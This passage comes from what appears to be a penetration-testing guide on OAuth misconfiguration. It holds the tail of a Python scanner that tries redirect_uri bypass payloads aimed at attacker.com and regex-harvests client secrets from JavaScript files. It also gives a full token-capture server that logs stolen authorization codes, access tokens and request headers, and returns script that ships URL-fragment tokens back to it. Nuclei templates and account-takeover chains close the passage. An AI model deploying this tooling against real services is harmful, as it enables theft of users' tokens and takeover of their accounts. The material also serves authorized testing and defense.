          js_paths = [
              "/static/js/main.js", "/static/js/app.js",
              "/bundle.js", "/app.js", "/config.js",
              "/env.js", "/.env", "/env.json",
              "/static/js/chunk.js", "/build/bundle.js",
          ]
          
          secret_patterns = [
              r'client_secret["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
              r'clientSecret["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
              r'OAUTH_SECRET["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
              r'app_secret["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
              r'GOOGLE_CLIENT_SECRET["\s:=]+["\']?([a-zA-Z0-9_-]{10,})',
              r'FACEBOOK_SECRET["\s:=]+["\']?([a-zA-Z0-9_-]{10,})',
              r'GITHUB_SECRET["\s:=]+["\']?([a-zA-Z0-9_-]{10,})',
          ]
          
          for path in js_paths:
              try:
                  resp = self.session.get(f"{self.target}{path}", timeout=10)
                  if resp.status_code == 200:
                      for pattern in secret_patterns:
                          matches = re.findall(pattern, resp.text)
                          for match in matches:
                              print(f"[!] SECRET FOUND in {path}: {match[:20]}...")
                              self.findings.append(f"Client secret in {path}")
              except:
                  pass
      
      def test_redirect_uri(self, auth_url, client_id, redirect_uri):
          """Test redirect_uri manipulation"""
          print(f"\n[*] Testing redirect_uri bypass...")
          
          parsed = urlparse(redirect_uri)
          base_domain = parsed.netloc
          
          variations = [
              f"{redirect_uri}/../redirect",
              f"{redirect_uri}?next=https://attacker.com",
              f"{redirect_uri}#@attacker.com",
              f"{redirect_uri}%23@attacker.com",
              f"{redirect_uri}/..",
              f"{redirect_uri}/",
              f"{redirect_uri}//",
              f"https://evil.{base_domain}/callback",
              f"https://{base_domain}@attacker.com/callback",
              f"http://{base_domain}{parsed.path}",
              f"https://{base_domain.upper()}{parsed.path}",
              f"https://attacker.com",
              f"https://attacker.com%00.{base_domain}/callback",
          ]
          
          for var_uri in variations:
              params = {
                  "response_type": "code",
                  "client_id": client_id,
                  "redirect_uri": var_uri,
                  "scope": "openid email",
                  "state": "test123",
              }
              try:
                  resp = self.session.get(
                      auth_url, params=params,
                      allow_redirects=False, timeout=10
                  )
                  # If not a direct error → might be accepted
                  if resp.status_code not in [400, 401, 403]:
                      location = resp.headers.get("Location", "")
                      if "error" not in location.lower():
                          print(f"[!] POTENTIAL BYPASS: {var_uri[:80]}")
                          print(f"    Status: {resp.status_code}")
                          self.findings.append(f"Redirect URI bypass: {var_uri[:80]}")
                      else:
                          print(f"    Rejected: {var_uri[:60]}")
                  else:
                      print(f"    Rejected: {var_uri[:60]}")
              except:
                  pass
      
      def test_state_parameter(self, auth_url, client_id, redirect_uri):
          """Test state parameter enforcement"""
          print(f"\n[*] Testing state parameter...")
          
          # Test without state:
          params = {
              "response_type": "code",
              "client_id": client_id,
              "redirect_uri": redirect_uri,
              "scope": "openid email",
          }
          try:
              resp = self.session.get(auth_url, params=params, allow_redirects=False, timeout=10)
              if resp.status_code not in [400, 403]:
                  print("[!] State parameter NOT required - CSRF possible!")
                  self.findings.append("Missing state parameter enforcement")
              else:
                  print("[+] State parameter appears to be required")
          except:
              pass
      
      def test_response_type(self, auth_url, client_id, redirect_uri):
          """Test if different response types are accepted"""
          print(f"\n[*] Testing response_type manipulation...")
          
          types = ["token", "id_token", "id_token+token", "code+token", "code+id_token"]
          
          for rt in types:
              params = {
                  "response_type": rt,
                  "client_id": client_id,
                  "redirect_uri": redirect_uri,
                  "scope": "openid email",
                  "state": "test",
                  "nonce": "test",
              }
              try:
                  resp = self.session.get(auth_url, params=params, allow_redirects=False, timeout=10)
                  if resp.status_code not in [400, 403]:
                      print(f"[!] response_type={rt} accepted!")
                      self.findings.append(f"Alternative response_type accepted: {rt}")
                  else:
                      print(f"    Rejected: {rt}")
              except:
                  pass
      
      def run_all(self):
          """Run all tests"""
          print("=" * 55)
          print("  OAUTH MISCONFIGURATION SCANNER")
          print(f"  Target: {self.target}")
          print("=" * 55)
          
          config = self.discover_oauth_config()
          self.extract_oauth_params()
          self.check_client_secrets()
          
          # Summary
          print(f"\n{'='*55}")
          print(f"  FINDINGS SUMMARY: {len(self.findings)}")
          print(f"{'='*55}")
          for f in self.findings:
              print(f"  [!] {f}")
          if not self.findings:
              print("  No issues found (manual testing recommended)")
          print(f"{'='*55}")

  if __name__ == "__main__":
      target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
      scanner = OAuthRecon(target)
      scanner.run_all()
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Capture Server"}
  ```python [token_server.py]
  #!/usr/bin/env python3
  """
  OAuth Token Capture Server
  Listens for redirected authorization codes and tokens
  """
  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  import json
  import ssl
  import datetime

  LOGFILE = "captured_tokens.json"
  PORT = 8443

  class TokenHandler(BaseHTTPRequestHandler):
      def do_GET(self):
          parsed = urlparse(self.path)
          params = parse_qs(parsed.query)
          
          # Capture from URL query parameters
          capture = {
              "timestamp": str(datetime.datetime.now()),
              "path": self.path,
              "method": "GET",
              "params": {k: v[0] for k, v in params.items()},
              "headers": dict(self.headers),
              "client_ip": self.client_address[0],
          }
          
          # Check for authorization code
          if "code" in params:
              print(f"\n{'='*50}")
              print(f"[+] AUTHORIZATION CODE CAPTURED!")
              print(f"    Code: {params['code'][0]}")
              print(f"    State: {params.get('state', ['N/A'])[0]}")
              print(f"    Time: {capture['timestamp']}")
              print(f"{'='*50}")
          
          # Check for access token (implicit flow)
          # Note: fragments (#) are NOT sent to server
          # But some misconfigurations put tokens in query string
          if "access_token" in params:
              print(f"\n{'='*50}")
              print(f"[+] ACCESS TOKEN CAPTURED!")
              print(f"    Token: {params['access_token'][0][:50]}...")
              print(f"{'='*50}")
          
          # Log capture
          with open(LOGFILE, "a") as f:
              f.write(json.dumps(capture) + "\n")
          
          # Return a page that also captures fragment (for implicit flow)
          self.send_response(200)
          self.send_header("Content-Type", "text/html")
          self.end_headers()
          
          html = """
          <html><body>
          <h1>Processing...</h1>
          <script>
            // Capture URL fragment (implicit flow tokens)
            if (window.location.hash) {
              var fragment = window.location.hash.substring(1);
              // Send fragment to server
              fetch('/capture-fragment?' + fragment);
            }
            // Also send any query params
            if (window.location.search) {
              fetch('/capture-query' + window.location.search);
            }
          </script>
          </body></html>
          """
          self.wfile.write(html.encode())
      
      def do_POST(self):
          content_len = int(self.headers.get("Content-Length", 0))
          body = self.rfile.read(content_len).decode()
          
          capture = {
              "timestamp": str(datetime.datetime.now()),
              "path": self.path,
              "method": "POST",
              "body": body,
              "headers": dict(self.headers),
          }
          
          print(f"\n[+] POST data captured: {body[:200]}")
          
          with open(LOGFILE, "a") as f:
              f.write(json.dumps(capture) + "\n")
          
          self.send_response(200)
          self.end_headers()
          self.wfile.write(b'{"status":"captured"}')
      
      def log_message(self, format, *args):
          pass  # Suppress default logging

  print(f"[*] OAuth Token Capture Server starting on port {PORT}")
  print(f"[*] Logging to {LOGFILE}")
  print(f"[*] Waiting for redirected tokens...")
  
  server = HTTPServer(("0.0.0.0", PORT), TokenHandler)

  # Optional: Add HTTPS
  # ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
  # ssl_context.load_cert_chain("cert.pem", "key.pem")
  # server.socket = ssl_context.wrap_socket(server.socket)

  server.serve_forever()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nuclei Templates"}
  ::code-collapse
  ```yaml [oauth-misconfig.yaml]
  id: oauth-open-redirect-uri

  info:
    name: OAuth Open Redirect URI
    author: security-researcher
    severity: high
    description: Tests if OAuth authorization endpoint accepts arbitrary redirect URIs
    tags: oauth,redirect,misconfiguration

  http:
    - method: GET
      path:
        - "{{BaseURL}}/authorize?response_type=code&client_id={{client_id}}&redirect_uri=https://attacker.com/callback&scope=openid&state=test"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 302
            - 301
            - 200
        - type: word
          part: header
          words:
            - "attacker.com"
          negative: false

  ---

  id: oauth-missing-state

  info:
    name: OAuth Missing State Parameter
    author: security-researcher
    severity: medium
    description: OAuth flow proceeds without state parameter (CSRF vulnerability)
    tags: oauth,csrf,state

  http:
    - method: GET
      path:
        - "{{BaseURL}}/authorize?response_type=code&client_id={{client_id}}&redirect_uri={{redirect_uri}}&scope=openid"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 302
            - 200
        - type: word
          part: header
          negative: true
          words:
            - "error"
            - "invalid"

  ---

  id: oauth-implicit-flow-enabled

  info:
    name: OAuth Implicit Flow Enabled
    author: security-researcher
    severity: medium
    description: Authorization server accepts response_type=token (implicit flow)
    tags: oauth,implicit,token

  http:
    - method: GET
      path:
        - "{{BaseURL}}/authorize?response_type=token&client_id={{client_id}}&redirect_uri={{redirect_uri}}&scope=openid&nonce=test"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 302
            - 200
        - type: word
          part: header
          negative: true
          words:
            - "unsupported_response_type"
            - "invalid_request"

  ---

  id: oauth-client-secret-in-js

  info:
    name: OAuth Client Secret Exposed in JavaScript
    author: security-researcher
    severity: critical
    description: Client secret found in JavaScript source code
    tags: oauth,secret,exposure

  http:
    - method: GET
      path:
        - "{{BaseURL}}/static/js/main.js"
        - "{{BaseURL}}/static/js/app.js"
        - "{{BaseURL}}/bundle.js"
        - "{{BaseURL}}/config.js"
      matchers:
        - type: regex
          regex:
            - 'client[_-]?secret[\s"\'=:]+["\']?[a-zA-Z0-9_-]{20,}'
            - 'clientSecret[\s"\'=:]+["\']?[a-zA-Z0-9_-]{20,}'
            - 'OAUTH[_-]?SECRET[\s"\'=:]+["\']?[a-zA-Z0-9_-]{20,}'
            - 'app[_-]?secret[\s"\'=:]+["\']?[a-zA-Z0-9_-]{20,}'

  ---

  id: oauth-well-known-config

  info:
    name: OAuth OpenID Configuration Exposed
    author: security-researcher
    severity: info
    description: OpenID Connect discovery endpoint found
    tags: oauth,oidc,discovery

  http:
    - method: GET
      path:
        - "{{BaseURL}}/.well-known/openid-configuration"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: word
          words:
            - "authorization_endpoint"
            - "token_endpoint"
          condition: and
  ```
  ::
  :::
::

---

## Privilege Escalation Chains

::card-group
  ::card
  ---
  title: Redirect URI Bypass → Code Theft → Full ATO
  icon: i-lucide-external-link
  ---
  Bypass redirect_uri validation → Steal authorization code → Exchange for access token → **Full account takeover** of any user who clicks the link. **Severity: Critical**.
  ::

  ::card
  ---
  title: Missing State → CSRF Account Linking → Persistent ATO
  icon: i-lucide-link
  ---
  No state parameter → Force victim to link attacker's OAuth → Attacker logs in as victim **permanently** via their own social account. **Severity: High**.
  ::

  ::card
  ---
  title: Scope Escalation → Private Data Access
  icon: i-lucide-database
  ---
  Add admin/elevated scopes → Access private repositories, emails, drive files, or admin APIs beyond intended authorization. **Severity: High-Critical**.
  ::

  ::card
  ---
  title: Client Secret → App Impersonation → Mass ATO
  icon: i-lucide-key
  ---
  Leaked client secret → Create fake login page using real OAuth credentials → **Every user who authenticates** gives tokens to attacker. **Severity: Critical**.
  ::

  ::card
  ---
  title: PKCE Bypass → Code Interception → ATO
  icon: i-lucide-shield-off
  ---
  Remove or downgrade PKCE → Authorization code interception attack viable → Exchange intercepted code for token → **Account takeover**. **Severity: High**.
  ::

  ::card
  ---
  title: Pre-Registration → Email Collision → Account Hijack
  icon: i-lucide-user-x
  ---
  Register account with victim's email before they sign up → Victim later uses OAuth → App links to existing account → **Both attacker and victim share access**. **Severity: High**.
  ::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: PortSwigger - OAuth Vulnerabilities
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/oauth
  target: _blank
  ---
  Comprehensive interactive labs covering OAuth authentication vulnerabilities including redirect URI bypass, token theft, and CSRF attacks.
  ::

  ::card
  ---
  title: HackTricks - OAuth
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
  target: _blank
  ---
  Detailed OAuth misconfiguration guide covering account takeover techniques, redirect URI manipulation, and token leakage exploitation.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - OAuth
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth
  target: _blank
  ---
  Curated collection of OAuth attack payloads, redirect URI bypass techniques, and account takeover methods.
  ::

  ::card
  ---
  title: RFC 6749 - OAuth 2.0 Framework
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc6749
  target: _blank
  ---
  The official OAuth 2.0 specification. Understanding the standard is essential for identifying deviations and misconfigurations.
  ::

  ::card
  ---
  title: RFC 7636 - PKCE
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc7636
  target: _blank
  ---
  Proof Key for Code Exchange specification. Defines how PKCE protects public clients from authorization code interception attacks.
  ::

  ::card
  ---
  title: OAuth 2.0 Security Best Practices
  icon: i-lucide-shield-check
  to: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
  target: _blank
  ---
  IETF draft on OAuth 2.0 security best current practices, covering known attack vectors and recommended mitigations.
  ::

  ::card
  ---
  title: OpenID Connect Core Specification
  icon: i-lucide-file-text
  to: https://openid.net/specs/openid-connect-core-1_0.html
  target: _blank
  ---
  Official OIDC specification covering ID tokens, claims, UserInfo endpoint, and authentication flows built on OAuth 2.0.
  ::

  ::card
  ---
  title: Bug Bounty OAuth Reports
  icon: i-lucide-bug
  to: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPOAUTH.md
  target: _blank
  ---
  Collection of real-world HackerOne bug bounty reports involving OAuth misconfigurations with full details and bounty amounts.
  ::

  ::card
  ---
  title: OAuth.net
  icon: i-lucide-globe
  to: https://oauth.net/2/
  target: _blank
  ---
  Community resource for OAuth 2.0 including code libraries, server implementations, and educational resources for understanding OAuth flows.
  ::

  ::card
  ---
  title: JWT.io
  icon: i-lucide-key-round
  to: https://jwt.io/
  target: _blank
  ---
  JWT decoder and debugger. Essential tool for inspecting OAuth access tokens and OIDC ID tokens for claim manipulation testing.
  ::

  ::card
  ---
  title: NahamSec - OAuth Attacks
  icon: i-lucide-video
  to: https://www.youtube.com/@NahamSec
  target: _blank
  ---
  Video tutorials and live hacking streams demonstrating real-world OAuth vulnerability discovery in bug bounty programs.
  ::

  ::card
  ---
  title: OWASP OAuth Cheat Sheet
  icon: i-lucide-shield-check
  to: https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html
  target: _blank
  ---
  OWASP's practical cheat sheet for secure OAuth implementation covering common pitfalls, redirect URI validation, and token handling.
  ::
::